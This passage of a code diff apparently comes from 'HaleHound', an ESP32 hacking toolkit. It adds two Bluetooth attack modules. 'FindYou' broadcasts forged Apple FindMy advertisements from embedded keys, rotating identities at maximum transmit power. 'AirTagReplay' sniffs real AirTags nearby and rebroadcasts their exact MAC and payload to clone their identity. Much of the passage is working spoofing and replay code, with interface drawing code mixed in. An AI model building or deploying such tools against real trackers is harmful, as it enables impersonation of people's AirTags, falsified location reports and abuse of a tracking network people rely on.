+        // Standby — clear dynamic text
+        tft.fillRect(0, FY_INFO_Y + 40, SCREEN_WIDTH, 24, TFT_BLACK);
+
+        // Standby bars
+        int barW = FY_BAR_TOTAL_W / FY_NUM_BARS;
+        tft.fillRect(12, FY_BAR_Y, FY_BAR_TOTAL_W, 18, TFT_BLACK);
+        for (int i = 0; i < FY_NUM_BARS; i++) {
+            int x = 12 + (i * barW);
+            int barH = 3 + (i % 3);
+            tft.fillRect(x + 1, FY_BAR_Y + 18 - barH, barW - 2, barH, HALEHOUND_GUNMETAL);
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// SKULL ROW WAVE ANIMATION
+// ═══════════════════════════════════════════════════════════════════════════
+
+// PROGMEM skull icon table
+static const unsigned char* const fySkulls[FY_SKULL_NUM] PROGMEM = {
+    bitmap_icon_skull_wifi,
+    bitmap_icon_skull_bluetooth,
+    bitmap_icon_skull_jammer,
+    bitmap_icon_skull_subghz,
+    bitmap_icon_skull_ir,
+    bitmap_icon_skull_tools,
+    bitmap_icon_skull_setting,
+    bitmap_icon_skull_about
+};
+
+static void fyDrawSkulls() {
+    int skullStartX = 10;
+    int skullSpacing = (SCREEN_WIDTH - 20) / FY_SKULL_NUM;
+    int frame = (int)(millis() / 120);
+
+    for (int i = 0; i < FY_SKULL_NUM; i++) {
+        int x = skullStartX + (i * skullSpacing);
+        tft.fillRect(x, FY_SKULL_Y, 16, 16, TFT_BLACK);
+
+        uint16_t color;
+        if (S && S->broadcasting) {
+            int phase = (frame + i) % 8;
+            if (phase < 4) {
+                color = fyGradientColor(phase / 3.0f);
+            } else {
+                float ratio = (phase - 4) / 3.0f;
+                uint8_t r = 80 - (uint8_t)(ratio * 80);
+                uint8_t g = 180 + (uint8_t)(ratio * (207 - 180));
+                uint8_t b = 100 + (uint8_t)(ratio * (255 - 100));
+                color = tft.color565(r, g, b);
+            }
+        } else {
+            color = HALEHOUND_GUNMETAL;
+        }
+
+        const unsigned char* icon = (const unsigned char*)pgm_read_ptr(&fySkulls[i]);
+        tft.drawBitmap(x, FY_SKULL_Y, icon, 16, 16, color);
+    }
+
+    // TX/OFF label
+    int labelX = skullStartX + (FY_SKULL_NUM * skullSpacing) + 5;
+    tft.fillRect(labelX - 5, FY_SKULL_Y, 50, 16, TFT_BLACK);
+    tft.setTextColor((S && S->broadcasting) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
+    tft.setTextSize(1);
+    tft.setCursor(labelX, FY_SKULL_Y + 4);
+    tft.print((S && S->broadcasting) ? "TX!" : "OFF");
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// COUNTER BAR
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void fyDrawCounter() {
+    if (!S) return;
+
+    int counterY = SCREEN_HEIGHT - 30;
+    tft.fillRect(0, counterY, SCREEN_WIDTH, 25, TFT_BLACK);
+
+    int barX = 10;
+    int barY = counterY + 2;
+    int barW = SCALE_W(140);
+    int barH = 10;
+
+    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
+    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);
+
+    // Fill based on key cycle progress (keyIndex / FINDYOU_KEY_COUNT)
+    float fillPct = (float)S->keyIndex / (float)FINDYOU_KEY_COUNT;
+    if (fillPct > 1.0f) fillPct = 1.0f;
+    int fillW = (int)(fillPct * barW);
+    if (fillW > 0) {
+        for (int px = 0; px < fillW; px++) {
+            float ratio = (float)px / (float)barW;
+            uint16_t c = fyGradientColor(ratio);
+            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
+        }
+    }
+
+    // Key index inside bar
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
+    char cntBuf[12];
+    snprintf(cntBuf, sizeof(cntBuf), "%u/%u", S->keyIndex, FINDYOU_KEY_COUNT);
+    tft.setCursor(barX + 4, barY + 1);
+    tft.print(cntBuf);
+
+    // Uptime
+    unsigned long upSecs = (millis() - S->uptimeStart) / 1000;
+    unsigned long upMins = upSecs / 60;
+    upSecs %= 60;
+    tft.setTextColor(S->broadcasting ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
+    tft.setCursor(SCALE_X(155), counterY + 3);
+    tft.printf("%lum%02lus", upMins, upSecs);
+
+    if (S->broadcasting) {
+        tft.drawBitmap(SCALE_X(220), counterY + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// FINDMY OF PAYLOAD BUILDER (from PROGMEM key)
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void buildFindYouPayload(uint16_t keyIdx, uint8_t mac[6], uint8_t payload[31]) {
+    // Read 28-byte P-224 public key X-coordinate from PROGMEM
+    uint8_t pk[28];
+    memcpy_P(pk, FINDYOU_KEYS[keyIdx], 28);
+
+    // MAC = first 6 bytes of public key, bit 6+7 set (non-resolvable private addr)
+    memcpy(mac, pk, 6);
+    mac[0] |= 0xC0;
+
+    // FindMy Offline Finding advertisement (identical format to real AirTags)
+    payload[0]  = 0x1E;  // AD Length (30 bytes follow)
+    payload[1]  = 0xFF;  // Manufacturer Specific Data
+    payload[2]  = 0x4C;  // Apple Inc (low byte)
+    payload[3]  = 0x00;  // Apple Inc (high byte)
+    payload[4]  = 0x12;  // FindMy OF type
+    payload[5]  = 0x19;  // OF data length (25 bytes)
+    payload[6]  = 0x00;  // Status byte (maintained, full battery)
+    memcpy(&payload[7], &pk[6], 22);  // pk[6..27] into payload[7..28]
+    payload[29] = pk[0] >> 6;         // Hint (top 2 bits of first key byte)
+    payload[30] = 0x00;               // Padding
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// CORE 0 BROADCAST TASK
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void fyBroadcastTask(void* param) {
+    S->taskRunning = true;
+
+    // Advertising parameters — non-connectable, all channels, ~1s interval (real AirTag cadence)
+    static const esp_ble_adv_params_t advP = {
+        .adv_int_min        = 0x0640,  // 1000ms (1600 × 0.625ms)
+        .adv_int_max        = 0x0C80,  // 2000ms (3200 × 0.625ms)
+        .adv_type           = ADV_TYPE_NONCONN_IND,
+        .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
+        .channel_map        = ADV_CHNL_ALL,
+        .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
+    };
+
+    uint8_t mac[6];
+    uint8_t payload[31];
+
+    // Build initial payload for current key
+    buildFindYouPayload(S->keyIndex, mac, payload);
+
+    esp_ble_gap_stop_advertising();
+    esp_ble_gap_set_rand_addr(mac);
+    esp_ble_gap_config_adv_data_raw(payload, 31);
+    delay(1);
+    esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);
+
+    S->totalKeys++;
+    S->lastMAC[0] = mac[0]; S->lastMAC[1] = mac[1]; S->lastMAC[2] = mac[2];
+    S->lastPK[0] = payload[7]; S->lastPK[1] = payload[8]; S->lastPK[2] = payload[9];
+    S->rotationStart = millis();
+
+    while (S->broadcasting) {
+        // Check if rotation interval elapsed
+        unsigned long elapsed = millis() - S->rotationStart;
+        if (elapsed >= (unsigned long)S->rotationSecs * 1000UL) {
+            // Rotate to next key
+            S->keyIndex++;
+            if (S->keyIndex >= FINDYOU_KEY_COUNT) {
+                S->keyIndex = 0;  // Wrap around
+            }
+
+            // Stop current advertisement
+            esp_ble_gap_stop_advertising();
+
+            // Build new payload from next key
+            buildFindYouPayload(S->keyIndex, mac, payload);
+
+            // Start advertising with new identity
+            esp_ble_gap_set_rand_addr(mac);
+            esp_ble_gap_config_adv_data_raw(payload, 31);
+            delay(1);
+            esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);
+
+            S->totalKeys++;
+            S->lastMAC[0] = mac[0]; S->lastMAC[1] = mac[1]; S->lastMAC[2] = mac[2];
+            S->lastPK[0] = payload[7]; S->lastPK[1] = payload[8]; S->lastPK[2] = payload[9];
+            S->rotationStart = millis();
+
+            #if CYD_DEBUG
+            Serial.printf("[FINDYOU] Rotated to key %u, MAC %02X:%02X:%02X:...\n",
+                          S->keyIndex, mac[0], mac[1], mac[2]);
+            #endif
+        }
+
+        // Check exit every 100ms
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+
+    esp_ble_gap_stop_advertising();
+    S->taskRunning = false;
+    S->taskHandle = NULL;
+    vTaskDelete(NULL);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// START / STOP / TOGGLE
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void startBroadcast() {
+    if (!S || S->broadcasting) return;
+    S->broadcasting = true;
+    S->rotationStart = millis();
+    fyDrawIconBar();
+    fyDrawHeader();
+    xTaskCreatePinnedToCore(fyBroadcastTask, "fyTx", 4096, NULL, 1, &S->taskHandle, 0);
+
+    #if CYD_DEBUG
+    Serial.printf("[FINDYOU] Started (Core 0), key %u, interval %us\n", S->keyIndex, S->rotationSecs);
+    #endif
+}
+
+static void stopBroadcast() {
+    if (!S) return;
+    S->broadcasting = false;
+
+    // Wait for task to exit gracefully (up to 500ms)
+    if (S->taskHandle != NULL) {
+        unsigned long start = millis();
+        while (S->taskRunning && (millis() - start < 500)) {
+            delay(10);
+        }
+        if (S->taskRunning) {
+            vTaskDelete(S->taskHandle);
+            S->taskRunning = false;
+        }
+        S->taskHandle = NULL;
+    }
+
+    esp_ble_gap_stop_advertising();
+    fyDrawIconBar();
+    fyDrawHeader();
+
+    #if CYD_DEBUG
+    Serial.println("[FINDYOU] Stopped");
+    #endif
+}
+
+static void toggleBroadcast() {
+    if (S && S->broadcasting) stopBroadcast(); else startBroadcast();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// SETUP / LOOP / EXIT / CLEANUP
+// ═══════════════════════════════════════════════════════════════════════════
+
+void setup() {
+    if (S && S->initialized) return;
+
+    #if CYD_DEBUG
+    Serial.println("[FINDYOU] Initializing Find You...");
+    #endif
+
+    // Allocate state on heap
+    S = (FyState*)calloc(1, sizeof(FyState));
+    if (!S) {
+        Serial.println("[FINDYOU] FATAL: calloc failed");
+        return;
+    }
+
+    tft.fillScreen(HALEHOUND_BLACK);
+    drawStatusBar();
+
+    // WiFi off, BLE on
+    WiFi.mode(WIFI_OFF);
+    delay(200);
+
+    releaseClassicBtMemory();
+    BLEDevice::init("HaleHound");
+    delay(150);
+
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+
+    Serial.println("[FINDYOU] BLE stack initialized, max TX power set");
+
+    // Initialize state
+    S->keyIndex          = 0;
+    S->rotationOptIdx    = 1;  // Default: 30s
+    S->rotationSecs      = FY_ROTATION_OPTS[S->rotationOptIdx];
+    S->rotationStart     = 0;
+    S->broadcasting      = false;
+    S->taskRunning       = false;
+    S->taskHandle        = NULL;
+    S->totalKeys         = 0;
+    S->uptimeStart       = millis();
+    S->initialized       = true;
+    S->exitRequested     = false;
+    S->staticDrawn       = false;
+    S->lastBroadcastState = false;
+    S->lastDisplayUpdate = millis();
+    S->lastIconTap       = 0;
+
+    // Draw initial UI
+    fyDrawIconBar();
+    fyDrawHeader();
+    fyDrawActivity();
+    fyDrawSkulls();
+    fyDrawCounter();
+
+    #if CYD_DEBUG
+    Serial.printf("[FINDYOU] Ready — %u keys loaded, rotation %us\n",
+                  FINDYOU_KEY_COUNT, S->rotationSecs);
+    #endif
+}
+
+void loop() {
+    if (!S || !S->initialized) return;
+
+    touchButtonsUpdate();
+
+    uint16_t tx, ty;
+    if (getTouchPoint(&tx, &ty)) {
+        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
+            // Debounce icon taps (300ms)
+            if (millis() - S->lastIconTap < 300) return;
+            S->lastIconTap = millis();
+            waitForTouchRelease();
+
+            if (tx >= 5 && tx <= 30) {
+                // Back button
+                if (S->broadcasting) stopBroadcast();
+                S->exitRequested = true;
+                return;
+            }
+            else if (tx >= 50 && tx <= 80) {
+                // Play/Stop toggle
+                toggleBroadcast();
+                return;
+            }
+            else if (tx >= 100 && tx <= 150) {
+                // Rotation interval cycle (only when stopped)
+                if (!S->broadcasting) {
+                    S->rotationOptIdx = (S->rotationOptIdx + 1) % FY_ROTATION_COUNT;
+                    S->rotationSecs = FY_ROTATION_OPTS[S->rotationOptIdx];
+                    fyDrawIconBar();
+                    #if CYD_DEBUG
+                    Serial.printf("[FINDYOU] Rotation interval: %us\n", S->rotationSecs);
+                    #endif
+                }
+                return;
+            }
+        }
+    }
+
+    // Hardware button support
+    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
+        if (S->broadcasting) stopBroadcast();
+        S->exitRequested = true;
+        return;
+    }
+    if (buttonPressed(BTN_SELECT)) toggleBroadcast();
+
+    yield();
+
+    // 10Hz display refresh
+    if (millis() - S->lastDisplayUpdate >= 100) {
+        fyDrawActivity();
+        fyDrawSkulls();
+        fyDrawCounter();
+        S->lastDisplayUpdate = millis();
+    }
+}
+
+bool isExitRequested() {
+    return S && S->exitRequested;
+}
+
+void cleanup() {
+    if (S) {
+        if (S->broadcasting) stopBroadcast();
+        if (S->taskHandle) {
+            S->broadcasting = false;
+            unsigned long start = millis();
+            while (S->taskRunning && (millis() - start < 500)) delay(10);
+            if (S->taskRunning) vTaskDelete(S->taskHandle);
+        }
+    }
+
+    BLEDevice::deinit(false);
+
+    if (S) {
+        free(S);
+        S = nullptr;
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[FINDYOU] Cleanup complete");
+    #endif
+}
+
+}  // namespace FindYou
+
+
+// ═══════════════════════════════════════════════════════════════════════════
+// AIRTAG REPLAY - FindMy Advertisement Sniff & Replay
+// Captures real AirTag/FindMy BLE advertisements (MAC + full 31-byte payload)
+// then replays them — ESP32 impersonates the real AirTag identity
+// Replay works until real AirTag rotates key: 15min near owner, 24hr separated
+// ═══════════════════════════════════════════════════════════════════════════
+
+namespace AirTagReplay {
+
+// ═══════════════════════════════════════════════════════════════════════════
+// CONSTANTS
+// ═══════════════════════════════════════════════════════════════════════════
+
+#define AR_MAX_TAGS        4
+#define AR_MAX_VISIBLE     4
+#define AR_LINE_HEIGHT     20
+#define AR_SCAN_DURATION   4
+#define AR_SKULL_Y         (SCREEN_HEIGHT - 48)
+#define AR_SKULL_NUM       8
+#define AR_BAR_Y           (SCREEN_HEIGHT - 30)
+
+// ═══════════════════════════════════════════════════════════════════════════
+// DATA STRUCTURES — 40 bytes per captured tag
+// ═══════════════════════════════════════════════════════════════════════════
+
+struct CapturedTag {
+    uint8_t mac[6];        // BLE MAC (= PK[0..5] | 0xC0)
+    uint8_t payload[31];   // Full raw advertisement payload
+    int8_t  rssi;          // Signal strength at capture
+    uint8_t battery;       // 0=full, 1=medium, 2=low, 3=critical
+    bool    selected;      // User selected for replay
+};
+
+// ═══════════════════════════════════════════════════════════════════════════
+// HEAP-ALLOCATED STATE — Only 4 bytes BSS (one pointer)
+// All module state lives on heap, allocated in setup(), freed in cleanup()
+// This avoids DRAM segment overflow at link time.
+// ═══════════════════════════════════════════════════════════════════════════
+
+struct ArState {
+    CapturedTag captured[AR_MAX_TAGS];
+    int8_t tagCount;
+    int8_t currentIndex;
+    int8_t listStartIndex;
+    int8_t totalScans;
+    volatile bool replaying;
+    volatile bool replayTaskRunning;
+    bool exitRequested;
+    bool initialized;
+    bool staticDrawn;
+    bool lastReplayState;
+    volatile uint32_t replayCount;
+    volatile uint32_t rateWindowCount;
+    volatile uint16_t replayRate;
+    TaskHandle_t replayTaskHandle;
+    BLEScan* pArScan;
+    unsigned long lastDisplayUpdate;
+    unsigned long lastIconTap;
+};
+
+static ArState* S = nullptr;
+
+// ═══════════════════════════════════════════════════════════════════════════
+// HELPERS
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void arMacToStr(const uint8_t* mac, char* buf, size_t len) {
+    snprintf(buf, len, "%02X:%02X:%02X:%02X:%02X:%02X",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+}
+
+static const char* arBatteryStr(uint8_t level) {
+    switch (level) {
+        case 0: return "FULL";
+        case 1: return "MED";
+        case 2: return "LOW";
+        case 3: return "CRIT";
+        default: return "???";
+    }
+}
+
+static uint16_t arBatteryColor(uint8_t level) {
+    switch (level) {
+        case 0: return HALEHOUND_GREEN;
+        case 1: return HALEHOUND_MAGENTA;
+        case 2: return HALEHOUND_HOTPINK;
+        case 3: return 0xF800;  // Red
+        default: return HALEHOUND_GUNMETAL;
+    }
+}
+
+static const char* arProximityStr(int rssi) {
+    if (rssi > -40) return "< 1m";
+    if (rssi > -55) return "1-3m";
+    if (rssi > -70) return "3-8m";
+    if (rssi > -85) return "8-15m";
+    return "> 15m";
+}
+
+static void arDrawRssiBar(int x, int y, int rssi) {
+    int bars = 0;
+    if (rssi > -40) bars = 5;
+    else if (rssi > -55) bars = 4;
+    else if (rssi > -65) bars = 3;
+    else if (rssi > -75) bars = 2;
+    else if (rssi > -90) bars = 1;
+
+    for (int i = 0; i < 5; i++) {
+        int barH = 3 + i * 2;
+        int barY = y + (12 - barH);
+        uint16_t color = (i < bars) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
+        tft.fillRect(x + i * 4, barY, 3, barH, color);
+    }
+}
+
+// Gradient color from cyan to hot pink (ratio 0.0 -> 1.0) — same as PhantomFlood
+static uint16_t arGradientColor(float ratio) {
+    if (ratio > 1.0f) ratio = 1.0f;
+    if (ratio < 0.0f) ratio = 0.0f;
+    uint8_t r = (uint8_t)(ratio * 255);
+    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
+    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
+    return tft.color565(r, g, b);
+}
+
+// Find existing captured tag by MAC, returns index or -1
+static int findCaptured(const uint8_t* mac) {
+    for (int i = 0; i < S->tagCount; i++) {
+        if (memcmp(S->captured[i].mac, mac, 6) == 0) return i;
+    }
+    return -1;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// SCAN ENGINE — Passive BLE scan, captures full FindMy OF advertisement
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void processScanResults(BLEScanResults results) {
+    int count = results.getCount();
+
+    for (int i = 0; i < count; i++) {
+        BLEAdvertisedDevice device = results.getDevice(i);
+
+        if (!device.haveManufacturerData()) continue;
+
+        std::string mfgData = device.getManufacturerData();
+        if (mfgData.length() < 27) continue;  // Need at least company(2)+type(1)+len(1)+status(1)+pk22=27
+
+        // Check for Apple company ID (0x004C) + FindMy type (0x12) + OF length (0x19)
+        uint8_t compLow  = (uint8_t)mfgData[0];
+        uint8_t compHigh = (uint8_t)mfgData[1];
+        uint8_t type     = (uint8_t)mfgData[2];
+        uint8_t len      = (uint8_t)mfgData[3];
+
+        if (compLow != 0x4C || compHigh != 0x00) continue;  // Not Apple
+        if (type != 0x12 || len != 0x19) continue;           // Not FindMy OF
+
+        // Get MAC address
+        uint8_t mac[6];
+        memcpy(mac, *device.getAddress().getNative(), 6);
+
+        // Check if already captured — update RSSI only
+        int existing = findCaptured(mac);
+        if (existing >= 0) {
+            S->captured[existing].rssi = (int8_t)device.getRSSI();
+            continue;
+        }
+
+        // Full — can't add more
+        if (S->tagCount >= AR_MAX_TAGS) continue;
+
+        // Capture this tag
+        CapturedTag& tag = S->captured[S->tagCount];
+        memcpy(tag.mac, mac, 6);
+
+        // Reconstruct full 31-byte advertisement payload:
+        // getManufacturerData() returns bytes AFTER the AD type header
+        // We need to prepend [0x1E, 0xFF] to make the full 31-byte advert
+        tag.payload[0] = 0x1E;  // AD Length (30 bytes follow)
+        tag.payload[1] = 0xFF;  // Manufacturer Specific Data AD type
+
+        // Copy manufacturer data (up to 29 bytes to fill payload[2..30])
+        int copyLen = mfgData.length();
+        if (copyLen > 29) copyLen = 29;
+        memcpy(&tag.payload[2], mfgData.data(), copyLen);
+
+        // Zero-pad if manufacturer data was shorter than 29 bytes
+        if (copyLen < 29) {
+            memset(&tag.payload[2 + copyLen], 0, 29 - copyLen);
+        }
+
+        // Extract battery from status byte (bits 6-7)
+        uint8_t statusByte = (mfgData.length() > 4) ? (uint8_t)mfgData[4] : 0;
+        tag.battery = (statusByte >> 6) & 0x03;
+
+        tag.rssi = (int8_t)device.getRSSI();
+        tag.selected = false;
+
+        S->tagCount++;
+
+        #if CYD_DEBUG
+        char macStr[18];
+        arMacToStr(mac, macStr, sizeof(macStr));
+        Serial.printf("[REPLAY] Captured tag %d: %s RSSI:%d BAT:%d payload[0..5]=%02X%02X%02X%02X%02X%02X\n",
+                      S->tagCount, macStr, device.getRSSI(), tag.battery,
+                      tag.payload[0], tag.payload[1], tag.payload[2], tag.payload[3],
+                      tag.payload[4], tag.payload[5]);
+        #endif
+    }
+}
+
+static void runScan() {
+    S->totalScans++;
+
+    BLEScanResults results = S->pArScan->start(AR_SCAN_DURATION, false);
+    processScanResults(results);
+    S->pArScan->clearResults();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// REPLAY ENGINE — Raw ESP-IDF broadcast cycle (same as Phantom Flood)
+// Uses captured MAC + payload for exact identity cloning
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void doReplayBroadcast(CapturedTag& tag) {
+    esp_ble_gap_stop_advertising();
+
+    // Set exact captured MAC address
+    esp_ble_gap_set_rand_addr(tag.mac);
+    esp_ble_gap_config_adv_data_raw(tag.payload, 31);
+    delay(1);
+
+    // Adv params — non-connectable, random address, all channels
+    // Declared on stack (not static) — avoids BSS for const struct
+    const esp_ble_adv_params_t advP = {
+        .adv_int_min = 0x20,
+        .adv_int_max = 0x20,
+        .adv_type = ADV_TYPE_NONCONN_IND,
+        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
+        .channel_map = ADV_CHNL_ALL,
+        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
+    };
+    esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);
+
+    // Real AirTags advertise ~every 2s when separated — match that cadence
+    delay(2000);
+    esp_ble_gap_stop_advertising();
+
+    S->replayCount++;
+    S->rateWindowCount++;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// CORE 0 REPLAY TASK
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void replayTxTask(void* param) {
+    S->replayTaskRunning = true;
+    unsigned long rateStart = millis();
+
+    while (S->replaying) {
+        // Find the selected tag
+        int targetIdx = -1;
+        for (int i = 0; i < S->tagCount; i++) {
+            if (S->captured[i].selected) { targetIdx = i; break; }
+        }
+        if (targetIdx < 0) {
+            S->replaying = false;
+            break;
+        }
+
+        doReplayBroadcast(S->captured[targetIdx]);
+
+        unsigned long now = millis();
+        if (now - rateStart >= 1000) {
+            S->replayRate = (uint16_t)S->rateWindowCount;
+            S->rateWindowCount = 0;
+            rateStart = now;
+        }
+
+        vTaskDelay(1);
+    }
+
+    S->replayTaskRunning = false;
+    vTaskDelete(NULL);
+}
+
+static void startReplayTask() {
+    if (S->replayTaskHandle != NULL) return;
+    xTaskCreatePinnedToCore(replayTxTask, "arReplay", 4096, NULL, 1, &S->replayTaskHandle, 0);
+}
+
+static void stopReplayTask() {
+    S->replaying = false;
+    if (S->replayTaskHandle == NULL) return;
+
+    unsigned long start = millis();
+    while (S->replayTaskRunning && (millis() - start < 3000)) {
+        delay(10);
+    }
+
+    if (S->replayTaskRunning) {
+        vTaskDelete(S->replayTaskHandle);
+    }
+
+    S->replayTaskHandle = NULL;
+    S->replayTaskRunning = false;
+    esp_ble_gap_stop_advertising();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// UI DRAWING — Phase 1: SCAN (list view) / Phase 2: REPLAY (broadcasting)
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void arDrawIconBar() {
+    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
+    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
+    // Back
+    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
+    // Scan
+    tft.drawBitmap(60, ICON_BAR_Y, bitmap_icon_undo, 16, 16, HALEHOUND_MAGENTA);
+    // Play/Stop
+    tft.drawBitmap(110, ICON_BAR_Y, bitmap_icon_start, 16, 16,
+                   S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA);
+    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
+}
+
+static void arDrawHeader() {
+    tft.fillRect(0, 38, SCREEN_WIDTH, 26, TFT_BLACK);
+    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);
+
+    drawGlitchTitle(58, "SNIFF");
+
+    tft.drawLine(0, 62, SCREEN_WIDTH, 62, HALEHOUND_HOTPINK);
+}
+
+static void arDrawStatus(const char* msg, uint16_t color) {
+    tft.fillRect(0, 63, SCREEN_WIDTH, 14, TFT_BLACK);
+    tft.setTextSize(1);
+    tft.setTextColor(color, TFT_BLACK);
+    tft.setCursor(5, 66);
+    tft.print(msg);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PHASE 1: TAG LIST — scrollable list of captured tags
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void arDrawTagList() {
+    int listY = 78;
+    tft.fillRect(0, listY, SCREEN_WIDTH, SCREEN_HEIGHT - listY, HALEHOUND_BLACK);
+
+    // Header info
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
+    tft.setCursor(5, listY);
+    tft.printf("TAGS: %d", S->tagCount);
+    tft.setCursor(80, listY);
+    tft.printf("SCANS: %d", S->totalScans);
+
+    if (S->tagCount == 0) {
+        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+        tft.setCursor(10, listY + 30);
+        tft.print("No FindMy trackers found");
+        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
+        tft.setCursor(10, listY + 48);
+        tft.print("Scanning for AirTags...");
+        return;
+    }
+
+    int y = listY + 14;
+    for (int i = 0; i < AR_MAX_VISIBLE && i + S->listStartIndex < S->tagCount; i++) {
+        int idx = i + S->listStartIndex;
+        CapturedTag& t = S->captured[idx];
+
+        // Highlight selected / current
+        if (idx == S->currentIndex) {
+            tft.fillRect(0, y - 1, SCREEN_WIDTH, AR_LINE_HEIGHT, HALEHOUND_DARK);
+        }
+
+        // Selection marker
+        if (t.selected) {
+            tft.setTextColor(HALEHOUND_HOTPINK, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
+            tft.setCursor(2, y + 3);
+            tft.print(">");
+        }
+
+        // RSSI bars
+        arDrawRssiBar(10, y + 1, t.rssi);
+
+        // Short MAC (last 3 octets)
+        uint16_t textCol = (idx == S->currentIndex) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
+        tft.setTextColor(textCol, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
+        tft.setCursor(33, y + 3);
+        char shortMac[12];
+        snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
+                 t.mac[3], t.mac[4], t.mac[5]);
+        tft.print(shortMac);
+
+        // Battery
+        tft.setTextColor(arBatteryColor(t.battery), (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
+        tft.setCursor(93, y + 3);
+        tft.print(arBatteryStr(t.battery));
+
+        // RSSI value
+        tft.setTextColor(HALEHOUND_VIOLET, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
+        tft.setCursor(130, y + 3);
+        tft.printf("%ddB", t.rssi);
+
+        // Proximity
+        tft.setTextColor(HALEHOUND_BRIGHT, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
+        tft.setCursor(175, y + 3);
+        tft.print(arProximityStr(t.rssi));
+
+        y += AR_LINE_HEIGHT;
+    }
+
+    // Footer
+    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
+    tft.setCursor(5, SCREEN_HEIGHT - 12);
+    tft.print("UP/DN=Nav SEL=Choose PLAY=TX");
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PHASE 2: REPLAY VIEW — broadcasting captured tag identity
+// ═══════════════════════════════════════════════════════════════════════════
+
+// PROGMEM skull icon table (pointers live in flash, not DRAM)
+static const unsigned char* const arSkulls[AR_SKULL_NUM] PROGMEM = {
+    bitmap_icon_skull_wifi,
+    bitmap_icon_skull_bluetooth,
+    bitmap_icon_skull_jammer,
+    bitmap_icon_skull_subghz,
+    bitmap_icon_skull_ir,
+    bitmap_icon_skull_tools,
+    bitmap_icon_skull_setting,
+    bitmap_icon_skull_about
+};
+
+static void arDrawStaticReplayInfo() {
+    tft.fillRect(0, 78, SCREEN_WIDTH, AR_SKULL_Y - 80, TFT_BLACK);
+
+    // Find selected tag
+    int selIdx = -1;
+    for (int i = 0; i < S->tagCount; i++) {
+        if (S->captured[i].selected) { selIdx = i; break; }
+    }
+    if (selIdx < 0) return;
+
+    CapturedTag& t = S->captured[selIdx];
+    int y = 80;
+
+    tft.setTextSize(1);
+
+    // Full MAC
+    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+    tft.setCursor(5, y);
+    tft.print("MAC: ");
+    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
+    char macStr[18];
+    arMacToStr(t.mac, macStr, sizeof(macStr));
+    tft.print(macStr);
